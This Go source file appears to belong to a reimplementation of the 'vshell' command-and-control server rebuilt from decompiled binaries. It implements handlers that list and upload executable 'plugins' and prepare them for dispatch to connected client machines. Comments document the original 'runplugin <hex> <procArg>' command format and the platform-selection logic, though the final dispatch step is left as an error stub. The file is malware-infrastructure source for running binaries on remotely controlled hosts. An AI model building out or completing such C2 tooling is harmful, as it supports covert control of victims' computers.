// Package controllers implements plugin-management HTTP handlers.
// Execution and upload behavior should be reviewed from the current implementation
// and tests; historical analysis notes are not security or compatibility guarantees.

package controllers

import (
	"errors"
	"io"
	"log"
	"os"
	"path/filepath"
	"strings"

	"vshell/c2engine"
)

// RunnerController 管理插件（runner）列表与下发。
type RunnerController struct {
	ApiBaseController
}

// List 返回服务器插件列表（GET /runner/list）。
// 反编译（0x18ed8a0）：目录 "./plugins"（9B XOR 数组 81 72 55 89 f3 85 0e d8 18
// ^ af 5d 25 e5 86 e2 67 b6 6b）经 FUN_005e8cc0 ReadDir；响应 = [{id: 下标,
// name: 条目名}]（FUN_00412ae0 建图，键 DAT_01bd6866="id" / DAT_01bd7df9="name"），
// JsonOkResult 直接返回列表（无 "plugins" 包装键）。
func (c *RunnerController) List() {
	plugins := engineListPlugins()
	c.JsonOkResult(plugins)
}

// RunPlugin 下发插件到客户端执行（POST /runner/runplugin）。
//
// 反编译（0x18edd80）参数与流程：
//
//	id         = JsonGetInt("id")（FUN_018d7f40，DAT_01bd6866）；GetClient(id)
//	             失败 → 错误。
//	pluginName = JsonGetStr(FUN_018fb3e0 解出的键 "pluginName")——面板提交的字段名，
//	             不是 "name"（前端 P 表 field:"pluginName"，ApiSelect 的 valueField
//	             也是 "name"，所以这里是插件文件名）。
//	procArg    = JsonGetStr(0x1bdbb72 = "procArg")——插件进程参数（7 字符）。
//	key        = JsonGetStr(FUN_018fb7a0 解出的键)；按同一套状态机模型解出为
//	             "windows_amd64"（13 字节）。原版用它去请求/挑选对应平台的插件。
//
// 随后按插件名做平台/架构选择（0x18ee02b 起）：
//
//	后缀 ".dll" → isDll；".net" → isNet；".exe" → isExe（DAT_01bd727d / 01bd7475 /
//	01bd72bd，4 字节**大小写敏感**比较）。三者都不是 → FUN_018fccc0 报
//	"support .elf,.so,.dylib executable, extensions"。
//	客户端架构取自 GetClient 结果对象的 +0x98/+0xa0，与 "amd64"（0x1bd87f8）/
//	"386"（0x1bd6b9b）比较后分别走 FUN_0164b680 / FUN_0164b8c0（内部用
//	FUN_0164bde0 的 0=386/1=amd64 与 FUN_0164bea0 的 0=bin/1=dll/2=exe/
//	3=net(amd64)/4=net(386)/5=vbs/6=js/7=xsl 组合出平台插件名）。
//	最后把选中的插件字节经 FUN_018fd220 按十六进制展开（表 DAT_1bdc772
//	="0123456789abcdef"，每字节 2 字符），拼成
//	`runplugin <hex> <procArg> <true|false>`（.net 走 "true"）下发。
//
// 未对齐、因此本函数不 dispatch：**插件字节的来源无法从控制器侧恢复**。
// 原版在 0x18edd80 内会读取选中的插件文件（FUN_018edf11 拿到的对象经其接口
// 方法 +0x38 返回长度、再逐字节喂给 FUN_018fd220 的十六进制展开），该对象的
// 类型与插件名拼接规则落在被剥离的引擎包内；命令里也没有可直接照抄的扩展名
// 占位。按项目规则"无法恢复就返回未实现"，这里走错误分支，避免发出一个
// payload 语义与原版不同的命令。（agent 侧同样没有 runplugin 处理器。）
func (c *RunnerController) RunPlugin() {
	id := int64(c.JsonGetInt("id"))
	name := c.JsonGetStr("pluginName")
	// procArg 与平台 key 都是原版读取的参数（键 "procArg" / "windows_amd64"），
	// 也是拼命令时的实参；载荷未对齐前不参与任何下发，这里只做读取占位。
	procArg := c.JsonGetStr("procArg")
	_ = c.JsonGetStr("windows_amd64")
	_ = procArg
	if id == 0 || name == "" {
		c.JsonErr("id and name required")
		return
	}
	client := c2engine.GetEngine().GetClient(id)
	if client == nil || !client.Status {
		c.JsonErr("client is close")
		return
	}

	// 后缀/类型在这里判定（判错即 FUN_018fccc0 分支），客户端架构在这里判定
	// （非 amd64/386 不进入平台选择分支）；两者都是原版命令前的强制前置检查。
	if _, ok := pluginKindByName(name); !ok {
		// 反编译 0x18ee67f：FUN_018fccc0 → "support .elf,.so,.dylib executable,
		// extensions"（0x18fccc0 解出）。
		c.JsonErr("support .elf,.so,.dylib executable, extensions")
		return
	}

	// 反编译（0x18edd80 0x18ee45f / 0x18ee4a8）：按客户端架构（"amd64"→1 /
	// "386"→2）选平台插件；其他架构不进入该分支。
	// 复刻端 client.Arch 目前恒为空串（checkin 报文的 arch 在 c2engine 的
	// NewClient 调用处被丢弃），因此这里实际返回 "unsupported architecture"；
	// 该行为本身就是"架构未知→不进入平台选择"，待引擎阶段补齐写入侧后自动生效。
	arch := engineClientArch(client)
	switch arch {
	case "amd64", "386":
	default:
		c.JsonErr("unsupported architecture")
		return
	}
	// 这里不猜测载荷：见文件末尾 RunPlugin 载荷未对齐的说明。
	c.JsonErr("runplugin payload not aligned")
}

// pluginKind 是 RunPlugin 的插件类型（反编译 FUN_0164bea0 的返回码子集）。
type pluginKind int

const (
	pluginDll pluginKind = iota // 反编译 0x18edd80：后缀 ".dll"
	pluginNet                   // 后缀 ".net"
	pluginExe                   // 反编译 0x18edd80：后缀 ".exe"
)

// extension 返回该类型对应的原版扩展名（DAT_01bd727d / 01bd7475 / 01bd72bd）。
//
// 仅用于展示与测试；原版并不把扩展名写进命令——命令里放的是插件二进制经
// FUN_018fd220 十六进制展开后的文本。
func (k pluginKind) extension() string {
	switch k {
	case pluginDll:
		return ".dll"
	case pluginNet:
		return ".net"
	default:
		return ".exe"
	}
}

// pluginKindByName 按插件名后缀选择平台插件类型。
//
// 反编译（0x18edd80，0x18ee02b 起）：逐个比较插件名末 4 字节——
// ".dll" → isDll；".net" → isNet（并置 "true" 分支）；".exe" → isExe。
// 三者都不匹配时 isExe/isDll/isNet 全为假 → 走 FUN_018fccc0 的报错分支。
//
// 注意：原版用 FUN_00403600 做**大小写敏感**的 4 字节比较；这里的 ToLower 是
// 复刻端有意放宽（Windows 文件名不区分大小写），并非原版行为。
func pluginKindByName(name string) (pluginKind, bool) {
	lower := strings.ToLower(name)
	switch {
	case strings.HasSuffix(lower, ".dll"):
		return pluginDll, true
	case strings.HasSuffix(lower, ".net"):
		return pluginNet, true
	case strings.HasSuffix(lower, ".exe"):
		return pluginExe, true
	default:
		return 0, false
	}
}

// engineClientArch 返回客户端上报的架构（"amd64" / "386" / ...）。
//
// 反编译（0x18edd80）：架构取自 GetClient 结果对象的 +0x98（string 指针）/
// +0xa0（长度），随后与 "amd64"（0x1bd87f8，5 字节）/ "386"（0x1bd6b9b，3 字节）
// 比较。
//
// 复刻端现状（必须明确，否则这段代码无法到达成功分支）：agent checkin 已经在
// 报文里带 arch（protocol.go 的 CheckinRequest.Arch，agent 侧 main.go 的 Checkin
// 用 runtime.GOARCH 填充），但写入侧 c2engine.Engine.NewClient 没有 arch 形参，
// 各连接处理器（c2engine/listener.go 与 c2engine/kcp.go 的 NewClient 调用）
// 因此把该字段丢弃，client.Arch 恒为空串，RunPlugin 的架构分支恒为失败。
// 这不是本文件能修的：c2engine 不属于本控制器的改动范围。
// engines 阶段把 checkin 的 Arch 落到 client.Arch 后，本函数无需改动即生效。
func engineClientArch(client *c2engine.Client) string {
	if client == nil {
		return ""
	}
	return client.Arch
}

// Upload 上传插件（POST /runner/upload）。参数：file。
func (c *RunnerController) Upload() {
	file, header, err := c.GetFile("file")
	if err != nil {
		c.JsonErr("upload failed: " + err.Error())
		return
	}
	defer file.Close()
	if err := engineSavePlugin(header.Filename, file); err != nil {
		c.JsonErr("save plugin failed: " + err.Error())
		return
	}
	c.JsonOkMessage("ok")
}

// ---- 引擎阶段对齐 ----

func engineListPlugins() []map[string]interface{} {
	// 反编译：FUN_005e8cc0("./plugins") 读目录，逐项 {id: 下标, name: 名称}
	entries, err := os.ReadDir(pluginsDir)
	if err != nil {
		return []map[string]interface{}{}
	}
	list := make([]map[string]interface{}, 0, len(entries))
	for i, e := range entries {
		list = append(list, map[string]interface{}{
			"id":   i,
			"name": e.Name(),
		})
	}
	return list
}

// pluginsDir 是插件目录（原版 "./plugins"，反编译字符串已解）。
const pluginsDir = "./plugins"

// engineSavePlugin 把上传的插件写入插件目录（原版 RunnerController.Upload
// 保存到 ./plugins 后由 engineListPlugins 列出）。
//
// 文件名来自 HTTP 头，必须剥离路径：否则 "../../x" 之类的名字会写到目录之外。
func engineSavePlugin(name string, src io.Reader) error {
	base := filepath.Base(filepath.FromSlash(name))
	if base == "." || base == ".." || base == string(filepath.Separator) || base == "" {
		return errors.New("invalid plugin name")
	}
	if err := os.MkdirAll(pluginsDir, 0o755); err != nil {
		return err
	}
	dst, err := os.OpenFile(filepath.Join(pluginsDir, base), os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0o755)
	if err != nil {
		return err
	}
	defer dst.Close()
	if _, err := io.Copy(dst, src); err != nil {
		return err
	}
	log.Printf("[runner] saved plugin %s", base)
	return nil
}
